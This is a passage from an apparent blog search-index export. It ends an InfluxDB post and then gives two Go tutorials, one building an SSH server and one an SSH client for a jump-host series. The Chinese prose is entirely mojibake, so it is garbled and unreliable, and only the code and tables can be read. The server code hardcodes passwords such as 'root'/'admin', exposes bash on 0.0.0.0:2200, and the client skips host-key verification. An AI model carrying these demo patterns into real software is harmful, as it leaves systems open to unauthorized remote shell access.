7.6352015-08-18T00:36:00Z 7.3722015-08-18T00:48:00Z 7.11name: h2o_feettags: location = santa_monicatime max---- ---2015-08-18T00:00:00Z 2.1162015-08-18T00:12:00Z 2.1262015-08-18T00:24:00Z 2.0512015-08-18T00:36:00Z 2.0672015-08-18T00:48:00Z 1.991 Áî®Êà∑ËÆ§ËØÅÂíåÊùÉÈôêRetention PolicyCotinuous QueryÂ∏∏ËßÅÊìç‰Ωú(SQL)ÊÄßËÉΩÂª∫ËÆÆÂÆòÊñπÊúâÂæàËØ¶Ëß£ÁöÑËØ¥Êòé,ÊàëËøôÈáå‰ªÖÊà™ÂèñÂá∫ÂçïËäÇÁÇπÈÉ®ÂàÜ:ÂÆòÊñπÊé®ËçêÁ°¨‰ª∂ÈÖçÁΩÆ Load Field writes per second MOderate queries per second Unique series Low &lt; 5 thousand &lt; 5 &lt; 100 thousand Moderate &lt; 250 thousand &lt; 25 &lt; 1 million High &gt; 250 &gt; 25 &gt; 1 million Probobly infeasible &gt; 750 thousand &gt; 100 &gt; 10 million Ê†πÊçÆË¥üËΩΩÊÉÖÂÜµÂÆòÊñπÊé®ËçêÁöÑÁ°¨‰ª∂ÈúÄÊ±Ç: Load CPU RAM IOPS Low 2-4 cores 2-4 G 500 Moderate 4-6 cores 8-32 G 500-1000 High 8 cores 32+ G 1000+]]></content>
      <categories>
        <category>Êï∞ÊçÆÂ∫ì</category>
        <category>Êó∂Â∫èÊï∞ÊçÆÂ∫ì</category>
      </categories>
      <tags>
        <tag>influxdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ë∑≥ÊùøÊú∫Á≥ªÂàó(Âõõ)-Golang‰∏≠SSHÊúçÂä°Á´ØÁöÑÂÆûÁé∞]]></title>
    <url>%2F2017%2F02%2F23%2Fgo-ssh-server%2F</url>
    <content type="text"><![CDATA[‰∏äÁØáÂçöÂÆ¢‰ªãÁªç‰∫ÜÂ¶Ç‰Ωï‰∫≤ÊâãÂÆûÁé∞‰∏Ä‰∏™SSHÁöÑÂÆ¢Êà∑Á´Ø, ËøôÁØáÂçöÂÆ¢Â∞Ü‰ªãÁªçÂ¶Ç‰Ωï‰ΩøÁî®golangÁöÑSSHÂåÖÊûÑÂª∫‰∏Ä‰∏™Ëá™Â∑±ÁöÑSSH Server, ËøôÊ†∑Êàë‰ª¨Âü∫Êú¨Â∞±ËÉΩÊØîËæÉÂÖ®Èù¢ÁöÑ‰∫ÜËß£ÁöÑSSHÁöÑÂÆûÁé∞„ÄÇ‰∏∫Êàë‰ª¨ÁºñÂÜô‰∏Ä‰∏™SSH ProxyÂ•†ÂÆöÂü∫Áü≥„ÄÇ ÁÆÄ‰ªã ‰ª•‰∏äÊòØSSHÂçèËÆÆ‰∏Ä‰∏™Âü∫Êú¨Êû∂ÊûÑÂõæ, ÂÖ≥‰∫éSSHÂçèËÆÆÁöÑÁÆÄ‰ªãÂèØ‰ª•ÂèÇËÄÉË∑≥ÊùøÊú∫Á≥ªÂàó(‰∫å)-sshÂçèËÆÆÂéüÁêÜÁÆÄ‰ªã, Âè™ÊúâÂú®‰∫ÜËß£‰∫ÜSSHÂçèËÆÆÁõ∏ÂÖ≥ÁöÑÂü∫Á°Ä‰∏ä,ÊâçËÉΩÁêÜËß£SSHÂåÖÈáåÈù¢ÁöÑÂèÇÊï∞„ÄÇÂØπÁÖßÁùÄSSHÂçèËÆÆ, Â∞Ü‰∏äÈù¢ÁöÑÊû∂ÊûÑÂõæÂÅöÁÆÄË¶ÅËß£ËØª: TCP: Âª∫Á´ã‰º†ËæìÂ±ÇÈìæÊé•, ÁÑ∂ÂêéËøõË°åSSHÂçèËÆÆÂ§ÑÁêÜ Handshake: Âª∫Á´ãSSHÂçèËÆÆÈáåÈù¢ÁöÑ‰º†ËæìÂ±Ç[SSH-TRANS,ËØ•Â±Ç‰∏ªË¶ÅÊèê‰æõÂä†ÂØÜ‰º†Ëæì Authentication: SSHÂçèËÆÆÈáåÈù¢ÁöÑÁî®Êà∑ËÆ§ËØÅÂ±Ç[SSH-USERAUTH], Êèê‰æõÁî®Êà∑ËÆ§ËØÅ ChannelÂíåRequest: Ëøô‰∫õÈÉΩÊòØSSHÂçèËÆÆÈáåÈù¢ÁöÑÈìæÊé•Â±Ç[SSH-CONNECT], ËØ•Â±Ç‰∏ªË¶ÅÊòØÂ∞ÜÂ§ö‰∏™Âä†ÂØÜÈößÈÅìÂàÜÊàêÈÄªËæëÈÄöÈÅì, ÂèØ‰ª•Â§çÁî®ÈÄöÈÅì,ÈÄöÈÅìÊúâÊØîËæÉÂ§öÁöÑÁ±ªÂûãÔºösession„ÄÅx11„ÄÅforwarded-tcpip„ÄÅdirect-tcpip, ÈÄöÈÅìÈáåÈù¢ÁöÑRequestsÊòØÁî®‰∫éÊé•Êî∂ÂàõÂª∫ssh channleÁöÑËØ∑Ê±ÇÁöÑ, ËÄåssh channleÂ∞±ÊòØÈáåÈù¢ÁöÑconnection, Êï∞ÊçÆÁöÑ‰∫§‰∫íÂü∫‰∫éconnection‰∫§‰∫í„ÄÇ ServerÈÖçÁΩÆ È¶ñÂÖà, Êàë‰ª¨ÈúÄË¶ÅÂàõÂª∫‰∏Ä‰∏™SSH ServerÁöÑÈÖçÁΩÆ, ËøôÈáå‰∏ªË¶ÅÊòØÈÖçÁΩÆËÆ§ËØÅ, ‰Ωú‰∏∫‰∏Ä‰∏™SSH ServerÈªòËÆ§ÊòØÂ∫îËØ•ÊîØÊåÅ2ËÆ§ËØÅ: ÂØÜÈí•ËÆ§ËØÅÂíåÂØÜÁ†ÅËÆ§ËØÅ, ‰∏∫‰∫ÜÊñπ‰æøÊàë‰ªÖÂÆûÁé∞ÂØÜÁ†ÅËÆ§ËØÅ„ÄÇÂÆûÁé∞ÂØÜÁ†ÅËÆ§ËØÅÁöÑÊ†∏ÂøÉÊòØÂÆûÁé∞Server ConfigÂØπË±°ÈáåÈù¢ÁöÑPasswordCallbackÁöÑÂáΩÊï∞, ËØ•ÂáΩÊï∞ÁöÑÊ†∏ÂøÉÊòØËøîÂõû‰∏Ä‰∏™ssh.PermissionsÂØπË±°, ËØ•ÂØπË±°‰øùÊåÅ‰∫ÜUserËÆ§ËØÅÈÄöËøáÁöÑ‰ø°ÊÅØ„ÄÇËøôÈáå‰∏∫‰∫ÜÊñπ‰æø, Âπ∂Ê≤°ÊúâÂ∞ÜËÆ§ËØÅÁ≥ªÁªüÂíåPAMÂØπÊé•, ËÄåÊòØÁõ¥Êé•ÁÆÄÂçïÁöÑÂÆûÁé∞‰∫Ü‰∏Ä‰∏™Áî®Êà∑ÂêçÂØÜÁ†ÅÊØîËæÉ„ÄÇËøô‰πüÊòØÂæàÊ†∏ÂøÉÁöÑ‰∏Ä‰∏™ÁÇπ, Âü∫‰∫éÊ≠§ Êàë‰ª¨Âú®ËÆæËÆ°Ë∑≥ÊùøÊú∫ÁöÑÊó∂ÂÄô, ÂèØ‰ª•ÂÆûÁé∞ServerÁ´ØÁöÑÁªü‰∏ÄËÆ§ËØÅ, Âú®ËøôÈáåÊèíÂÖ•Áªü‰∏ÄËÆ§ËØÅÁöÑ‰ª£Á†Å„ÄÇ 12345678config := &amp;ssh.ServerConfig&#123; PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; if c.User() == "root" &amp;&amp; string(pass) == "admin" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;,&#125; ÂÖ∂Ê¨°, Êàë‰ª¨ÈúÄË¶ÅÈÖçÁΩÆSSH ServerÁöÑÁßÅÈí•, ÈúÄË¶Å‰øùËØÅÁßÅÈí•ÁöÑÂÆâÂÖ®, Âõ†‰∏∫‰ªñÁî®‰∫éËøõË°åÁßòÈí•‰∫§Êç¢ÁÆóÊ≥ïÁöÑÂÖ≥ÈîÆ(DH)1234567891011privateBytes, err := ioutil.ReadFile("id_rsa")if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)")&#125;private, err := ssh.ParsePrivateKey(privateBytes)if err != nil &#123; log.Fatal("Failed to parse private key")&#125;config.AddHostKey(private) Âª∫Á´ãSSHÈÄöÈÅì(SSHÈìæÊé•Â±Ç) SSH ServerÈÖçÁΩÆÂÆåÊàêÂêé, È¶ñÂÖàÂæóÂª∫Á´ãTCPÈìæÊé•123456789101112listener, err := net.Listen("tcp", "0.0.0.0:2200")if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err)&#125;log.Print("Listening on 2200...")for &#123; conn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; ÁÑ∂ÂêéÊàë‰ª¨ÈÄöËøássh.NewServerConnÊù•ÂçáÁ∫ßTCPÈìæÊé•‰∏∫SSHÈìæÊé•, sshÊèê‰æõÁöÑËøô‰∏™ÂáΩÊï∞Ê†πÊçÆ‰πãÂâçÁöÑÈÖçÁΩÆÂÆåÊàê: 1. ‰º†ËæìÂ±Ç[SSH-TRANS] 2. ËÆ§ËØÅÂ±Ç[SSH-USERAUTH] 3. ËøîÂõûÈìæÊé•Â±ÇÁöÑÈÄöÈÅì: incomingChannels, Êé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶ÅÂú®GoroutineÈáåÈù¢Â§ÑÁêÜËøô‰∫õÁî®Êà∑ÁöÑÈÄöÈÅì„ÄÇ1234567891011 sshConn, chans, reqs, err := ssh.NewServerConn(conn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans)&#125; ËøôÊ†∑Êàë‰ª¨Â∞±Â∑≤ÁªèÂÆåÊàê‰∫ÜSSH ServerÁöÑËøûÊé•ÁöÑÁõëÂê¨ ‰∏∫‰∫Ü‰∏çÈòªÂ°ûÈÄöÈÅìÁöÑÂ§ÑÁêÜ, Êàë‰ª¨Â∞ÜÊØè‰∏Ä‰∏™ÈÄöÈÅìÁöÑÂ§ÑÁêÜÈÉΩÊîæÂà∞GoroutineÈáåÈù¢ËøõË°å12345func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125; Âú®Â§ÑÁêÜssh channelÈáåÈù¢ÁöÑÊï∞ÊçÆ‰πãÂâç, Êàë‰ª¨ÈúÄË¶ÅÁü•ÈÅìchannelÁöÑÁ±ªÂûã, Âõ†‰∏∫‰∏çÂêåÁ±ªÂûãÁöÑchannelÈáåÈù¢ÊòØ‰∏çÂêåÁ±ªÂûãÁöÑÊï∞ÊçÆ, Â§ÑÁêÜÈÄªËæë‰πü‰∏ç‰∏ÄÊ†∑ÂÖ∑‰ΩìËßÅrfc4250ÁöÑ4.9.1, ÈáåÈù¢ÊúâÊØîËæÉËØ¶Ëß£ÁöÑËß£Èáä, Êàë‰ª¨ÂÖà‰∏çÂÆûÁé∞ÂÖ∂‰ªñÁöÑ,‰ªÖÂÆûÁé∞Â§ÑÁêÜsessionÁ±ªÂûãchannel„ÄÇ‰∏äÈù¢ÊèêÂà∞‰∫ÜÈÄöÈÅìÊúâ4ÁßçÁ±ªÂûã, ÊØèÁßçÁ±ªÂûãÈÉΩÊúâ‰∏çÂêåÁöÑÁî®ÈÄî,ËøôÈáåÊàë‰ª¨‰ªÖÂÆûÁé∞sessionÁ±ªÂûãÈÄöÈÅìÁöÑÂ§ÑÁêÜ„ÄÇ123456func handleChannel(newChannel ssh.NewChannel) &#123; if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, "unknown channel type") return &#125;&#125; Âª∫Á´ãSSH Channel(ÂõûËØù‰∫§‰∫í) ÈÄöÈÅìÊèê‰æõ‰∏Ä‰∏™AcceptÊñπÊ≥ï, ËØ•ÊñπÊ≥ïËøîÂõû2‰∏™queue, 1‰∏™Áî®‰∫éÊï∞ÊçÆ‰∫§Êç¢(Êû∂ÊûÑÂõæÈáåÈù¢ÁöÑconnection), 1‰∏™Áî®‰∫éÊéßÂà∂Êåá‰ª§ÁöÑ‰∫§‰∫í,ÊØîÂ¶ÇÂàõÂª∫connection queue(Êû∂ÊûÑÂõæÈáåÈù¢ÁöÑrequests)12345connection, requests, err := newChannel.Accept()if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return&#125; Êï∞ÊçÆ‰∫§‰∫íÊàë‰ª¨Â∞ÜËøêË°åbashÁ®ãÂ∫è,ÁÑ∂Âêébash‰∏é ssh channelÂØπÊé•, ‰ªéËÄåÂÆûÁé∞ÂíåbashÁöÑËøúÁ®ã‰∫§‰∫í, ‰ªéËøôÈáåÂèØ‰ª•ÁúãÂá∫, ÂÖ∂ÂÆûËøôÈáåÂèØ‰ª•Êâ©Â±ïÊÄßÂæàÈ´ò, Êàë‰ª¨Â¶ÇÊûúËøêË°åÂÖ∂‰ªñÊúçÂä°ÊØîÂ¶Çgit,ÈÇ£‰πàgit‰πüÂèØÈÄöËøásshÈìæÊé•Êù•‰∫§‰∫í„ÄÇ git‰πüÊ≠£ÊòØÈÄöËøáËøôÁßçÊñπÂºèÊîØÊåÅsshÁöÑ„ÄÇËøôÈáåÂáÜÂ§á‰∫Ü‰∏Ä‰∏™colseÂáΩÊï∞Áî®‰∫éÂÖ≥Èó≠ssh channelÂíåÈÄÄÂá∫bashÁ®ãÂ∫è1234567891011bash := exec.Command("bash")// Prepare teardown functionclose := func() &#123; _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; connection.Close() log.Printf("Session closed")&#125; Â¶ÇÊûúÊàë‰ª¨Áõ¥Êé•Â∞ÜbashÁöÑËæìÂÖ•ÂíåËæìÂá∫ÊµÅË°återminalËøôÂ∞ÜÂ§±Ë¥•, Âõ†‰∏∫bashÊ≤°ÊúâËøêË°åÂú®tty‰∏≠, Âõ†Ê≠§ËøôÈáåÈúÄË¶Å‰∏Ä‰∏™Ê®°Êãütty(pty)Êù•ËøêË°åbash„ÄÇ123456bashf, err := pty.Start(bash)if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return&#125; Êé•‰∏ãÊù•Êàë‰ª¨ÈúÄË¶ÅÂ∞Ü bashÁöÑÁÆ°ÈÅìÂíåconnectionÁöÑÁÆ°ÈÅìÂØπÊé•Ëµ∑Êù•, ËøôÈáå‰∏∫‰∫Ü‰øùËØÅcolseÂáΩÊï∞(connectionËµÑÊ∫êÈáäÊîæ)Âè™Ë¢´Ë∞ÉÁî®‰∏ÄÊ¨°‰ΩøÁî®ÁöÑsync.Once„ÄÇ123456789var once sync.Oncego func() &#123; io.Copy(connection, bashf) once.Do(close)&#125;()go func() &#123; io.Copy(bashf, connection) once.Do(close)&#125;() Êåá‰ª§‰∫§‰∫íËøôÈáå‰∏ªË¶ÅÊúâ‰ª•‰∏ãÂá†Á±ªËØ∑Ê±Ç: shell/exec/subsystem: channel request type for shell, ËøôÂá†Á±ª‰∏ªË¶ÅÊòØÁî®‰∫éÂå∫ÂàÜconnectionÈìæÊé•ÁöÑÁ®ãÂ∫è, shellÂÄºÂêéÈù¢ÂêØÂä®ÁöÑ‰∏Ä‰∏™Á®ãÂ∫èÊàñËÄÖshell, execÊåáÂêéÈù¢ÂêØÂä®ÁöÑÊòØÁî®Êà∑ÁöÑÈªòËÆ§shell, ËÄåsubsystemÊòØÂú®ÂêéÈù¢ÂêØÂä®‰∏Ä‰∏™Â≠êÁ®ãÂ∫èÊù•ÊâßË°åconnectionÈáåÈù¢ÁöÑÂëΩ‰ª§ pty-req: ÂáÜÂ§á‰∏Ä‰∏™ptyÁ≠âÂæÖËæìÂÖ• window-change: ÁõëÂê¨ttyÁ™óÂè£ÊîπÂèò‰∫ã‰ª∂„ÄÇÂèäÊó∂Êõ¥Êñ∞tty size„ÄÇ123456789101112131415161718192021 go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125; ÂÆåÊï¥‰ª£Á†Å‰ª•‰∏ãÊòØÂÆåÊï¥‰ª£Á†Å123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184package mainimport ( "encoding/binary" "fmt" "io" "io/ioutil" "log" "net" "os/exec" "sync" "syscall" "unsafe" "github.com/kr/pty" "golang.org/x/crypto/ssh")func main() &#123; // In the latest version of crypto/ssh (after Go 1.3), the SSH server type has been removed // in favour of an SSH connection type. A ssh.ServerConn is created by passing an existing // net.Conn and a ssh.ServerConfig to ssh.NewServerConn, in effect, upgrading the net.Conn // into an ssh.ServerConn config := &amp;ssh.ServerConfig&#123; //Define a function to run when a client attempts a password login PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; // Should use constant-time compare (or better, salt+hash) in a production setting. if c.User() == "foo" &amp;&amp; string(pass) == "bar" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;, // You may also explicitly allow anonymous client authentication, though anon bash // sessions may not be a wise idea // NoClientAuth: true, &#125; // You can generate a keypair with 'ssh-keygen -t rsa' privateBytes, err := ioutil.ReadFile("id_rsa") if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)") &#125; private, err := ssh.ParsePrivateKey(privateBytes) if err != nil &#123; log.Fatal("Failed to parse private key") &#125; config.AddHostKey(private) // Once a ServerConfig has been configured, connections can be accepted. listener, err := net.Listen("tcp", "0.0.0.0:2200") if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err) &#125; // Accept all connections log.Print("Listening on 2200...") for &#123; tcpConn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; // Before use, a handshake must be performed on the incoming net.Conn. sshConn, chans, reqs, err := ssh.NewServerConn(tcpConn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; log.Printf("New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion()) // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans) &#125;&#125;func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; // Service the incoming Channel channel in go routine for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125;func handleChannel(newChannel ssh.NewChannel) &#123; // Since we're handling a shell, we expect a // channel type of "session". The also describes // "x11", "direct-tcpip" and "forwarded-tcpip" // channel types. if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t)) return &#125; // At this point, we have the opportunity to reject the client's // request for another logical connection connection, requests, err := newChannel.Accept() if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return &#125; // Fire up bash for this session bash := exec.Command("bash") // Prepare teardown function close := func() &#123; connection.Close() _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; log.Printf("Session closed") &#125; // Allocate a terminal for this channel log.Print("Creating pty...") bashf, err := pty.Start(bash) if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return &#125; //pipe session to bash and visa-versa var once sync.Once go func() &#123; io.Copy(connection, bashf) once.Do(close) &#125;() go func() &#123; io.Copy(bashf, connection) once.Do(close) &#125;() // Sessions have out-of-band requests such as "shell", "pty-req" and "env" go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) // Responding true (OK) here will let the client // know we have a pty ready for input req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125;// parseDims extracts terminal dimensions (width x height) from the provided buffer.func parseDims(b []byte) (uint32, uint32) &#123; w := binary.BigEndian.Uint32(b) h := binary.BigEndian.Uint32(b[4:]) return w, h&#125;// Winsize stores the Height and Width of a terminal.type Winsize struct &#123; Height uint16 Width uint16 x uint16 // unused y uint16 // unused&#125;// SetWinsize sets the size of the given pty.func SetWinsize(fd uintptr, w, h uint32) &#123; ws := &amp;Winsize&#123;Width: uint16(w), Height: uint16(h)&#125; syscall.Syscall(syscall.SYS_IOCTL, fd, uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))&#125;]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>ssh-jumphost</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ë∑≥ÊùøÊú∫Á≥ªÂàó(‰∏â)-Golang‰∏≠SSHÂÆ¢Êà∑Á´ØÁöÑÂÆûÁé∞]]></title>
    <url>%2F2017%2F02%2F22%2Fssh-protocol-go%2F</url>
    <content type="text"><![CDATA[‰∏äÈù¢Âá†ÁØáÂçöÂÆ¢Â∑≤Áªè‰ªãÁªçËøáÂä†ÂØÜÁÆóÊ≥ïÂíåsshÂçèËÆÆÁöÑÊûÑÊàê, ËøôÁØáÂçöÂÆ¢‰∏ªË¶ÅÂ∞Ü‰ªãÁªçgolang‰∏≠sshÂ∫ìÁöÑ‰∏Ä‰∫õÂÖ∑‰Ωì‰ΩøÁî®,‰∏∫ÂêéÈù¢ÂÜôsshÁöÑË∑≥ÊùøÊú∫ÂÅöÈì∫Âû´„ÄÇ Ê†óÂ≠êÂÖà‰∏ä2‰∏™Ê†óÂ≠ê, ÂêéÈù¢‰ºöÂØπÊ≠§ÂÅöËØ¶ÁªÜ‰ªãÁªçShell‰∫§‰∫íÊ®°Âºè1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 package mainimport ( "log" "os" "golang.org/x/crypto/ssh" "golang.org/x/crypto/ssh/terminal")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() session.Stdout = os.Stdout session.Stderr = os.Stderr session.Stdin = os.Stdin modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; termFD := int(os.Stdin.Fd()) w, h, _ := terminal.GetSize(termFD) termState, _ := terminal.MakeRaw(termFD) defer terminal.Restore(termFD, termState) err = session.RequestPty("xterm-256color", h, w, modes) ce(err, "request pty") err = session.Shell() ce(err, "start shell") err = session.Wait() ce(err, "return")&#125; ËøúÁ®ãÂëΩ‰ª§Ê®°Âºè123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "bytes" "fmt" "log" "golang.org/x/crypto/ssh")func main() &#123; ce := func(err error, msg string) &#123; if err != nil &#123; log.Fatalf("%s error: %v", msg, err) &#125; &#125; client, err := ssh.Dial("tcp", "localhost:1234", &amp;ssh.ClientConfig&#123; User: "root", Auth: []ssh.AuthMethod&#123;ssh.Password("xxx")&#125;, &#125;) ce(err, "dial") session, err := client.NewSession() ce(err, "new session") defer session.Close() modes := ssh.TerminalModes&#123; ssh.ECHO: 1, ssh.ECHOCTL: 0, ssh.TTY_OP_ISPEED: 14400, ssh.TTY_OP_OSPEED: 14400, &#125; err = session.RequestPty("xterm-256color", 80, 40, modes) ce(err, "request pty") if err := session.Setenv("LC_USR_DIR", "/usr"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; var b bytes.Buffer session.Stdout, session.Stderr = &amp;b, &amp;b if err := session.Run("ls -l $LC_USR_DIR"); err != nil &#123; panic("Failed to run: " + err.Error()) &#125; fmt.Println(b.String())&#125; ÁÆÄ‰ªãSSH(Secure Shell)ÊòØ‰∏Ä‰∏™Êèê‰æõÊï∞ÊçÆÈÄö‰ø°ÂÆâÂÖ®„ÄÅËøúÁ®ãÁôªÂΩï„ÄÅËøúÁ®ãÊåá‰ª§ÊâßË°åÁ≠âÂäüËÉΩÁöÑÂÆâÂÖ®ÁΩëÁªúÂçèËÆÆ, ÂÖ∑‰ΩìÂèØ‰ª•Êü•ÈòÖÊàëÁöÑ‰∏ä‰∏ÄÁØáÂçöÂÆ¢Ë∑≥ÊùøÊú∫Á≥ªÂàó(‰∫å)-sshÂçèËÆÆÂéüÁêÜÁÆÄ‰ªã‰ΩÜÊòØgolangÁöÑsshÂåÖÂπ∂‰∏çÂú®golangÁöÑÊ†áÂáÜÂ∫ì‰∏≠, Âú®: godoc.org/golang.org/x/crypto/ssh‰∏≠, ÊâÄ‰ª•ÈúÄË¶ÅÁøªÂ¢ôÊâçËÉΩ‰∏ãÂà∞„ÄÇgolangÁöÑËøô‰∏™sshÂåÖÂêåÊó∂ÂÆûÁé∞‰∫ÜsshÁöÑÂÆ¢Êà∑Á´ØÂíåserverÁ´Ø, ‰πüËÆ∏‰Ω†‰πüÁªèÂ∏∏ÁúãÂà∞‰∏Ä‰∏™ssh-agentÁöÑ‰∏úË•ø, ‰πüÂú®Ëøô‰∏™ÂåÖÊã¨, ‰ΩÜÊàë‰∏çÂ∞Ü‰ªñÂΩíÁ∫≥Âú®clientÂíåserverÈáåÈù¢, Âõ†‰∏∫ssh-agentÊòØ‰∏Ä‰∏™Áî®‰∫é‰øùÂ≠òÁßÅÈí•ÁöÑÁ®ãÂ∫è, Âú®Êï∞Â≠óÁ≠æÂêçÈ™åËØÅÊó∂(RSA, DSA, ECDSA, Ed25519)Êèê‰æõË∫´‰ªΩËÆ§ËØÅ, ÂÆÉÂ∞±ÊòØ‰∏Ä‰∏™Â∏ÆÂä©Êàë‰ª¨È™åËØÅË∫´‰ªΩÁöÑÁ®ãÂ∫è„ÄÇÊé•‰∏ãÊù•‰∏ªË¶ÅËÆ≤ssh clent, ‰ΩÜÊòØËøòÊòØ‰ºöÊ∂âÂèäÂà∞‰∏ÄÁÇπssh-agentÁöÑÈÉ®ÂàÜ„ÄÇ ËÆ§ËØÅË¶Å‰ΩøÁî®sshÁöÑÂÆ¢Êà∑Á´Ø, ÈÇ£‰πàËÆ§ËØÅÂ∞±ÊØîËæÉÂÖ≥ÈîÆ‰∫Ü, sshÊèê‰æõ2ÁßçËÆ§ËØÅÊñπÂºè: Áî®Êà∑ÂêçÂØÜÁ†ÅËÆ§ËØÅÂíåÂØÜÈí•ËÆ§ËØÅ„ÄÇÈÄöËøásshÊèê‰æõÁöÑ‰∏Ä‰∏™configÂØπË±°, Êàë‰ª¨ÂèØ‰ª•ÈÖçÁΩÆssh‰ΩøÁî®ÁöÑËÆ§ËØÅÊñπÂºè. ËÄåÈÖçÁΩÆÂØπË±°ÈáåÈù¢ÂÖ≥‰∫éËÆ§ËØÅÁöÑÈÖçÁΩÆ‰ΩøÁî®ÁöÑÊòØssh.AuthMethodÊé•Âè£, ssh.AuthMethodÊòØauthÁöÑÊÄªÊé•Âè£(Â≠òÂÇ®ÂÆûÁé∞‰∫Üauth Âíå methodÁöÑÂØπË±°), AuthMethodÂëàÁé∞ÁöÑÊòØ‰∏Ä‰∏™ÂÆûÁé∞‰∫ÜRFC4252ËÆ§ËØÅÊñπÊ≥ïÁöÑÂÆû‰æã„ÄÇ Áî®Êà∑ÂêçÂØÜÁ†ÅËÆ§ËØÅËÆ§ËØÅÊñπÂºèÂ¶ÇÊûú‰ΩøÁî®PasswordÊñπÂºèÁöÑËØù ÈÇ£‰πàÂèØ‰ª•‰ΩøÁî®ssh.PasswordÊñπÊ≥ïËé∑Âèñ‰∏Ä‰∏™AuthMethodÊé•Âè£ÂØπË±°„ÄÇ123456sshConfig := &amp;ssh.ClientConfig&#123; User: "your_user_name", Auth: []ssh.AuthMethod&#123; ssh.Password("your_password") &#125;,&#125; ÂØÜÈí•ËÆ§ËØÅÂâçÊèê: ÂØÜÈí•ËÆ§ËØÅÁöÑÊú¨Ë¥®ÊòØ‰ΩøÁî®ÈùûÂØπÁß∞Âä†ÂØÜÁöÑÊï∞Â≠óÁ≠æÂêçÂäüËÉΩ, ÊâÄ‰ª•ÂøÖÈ°ªÂ∞Ü‰Ω†ÁöÑÂÖ¨ÂÖ±ÂØÜÈí•Â°´ÂÖÖÂà∞‰∏Ä‰∏™ËøúÁ®ãÊú∫Âô®‰∏äÁöÑauthorized_keysÊñá‰ª∂‰∏≠ ‰Ω†ÂèØ‰ª•ÊâãÂä®ÂÆåÊàê, ‰πüÂèØ‰ª•‰ΩøÁî®ssh-copy-idËøô‰∏™ÂëΩ‰ª§Êù•Â∏Æ‰Ω†ÂÆåÊàê„ÄÇÂú®ÂÖ¨Èí•Êé®ÈÄÅokËøáÂêé, ‰ΩøÁî®ÁßòÈí•ËÆ§ËØÅ, ËøôÈáåÊúâ‰∏§ÁßçÊñπÂºèÂèØ‰ª•Ëé∑ÂèñÁî®Êà∑ÁöÑÁßÅÈí•, Áî®‰∫éÁ≠æÂêçÁÆóÊ≥ïÊó∂ÂÅöË∫´‰ªΩËÆ§ËØÅ: 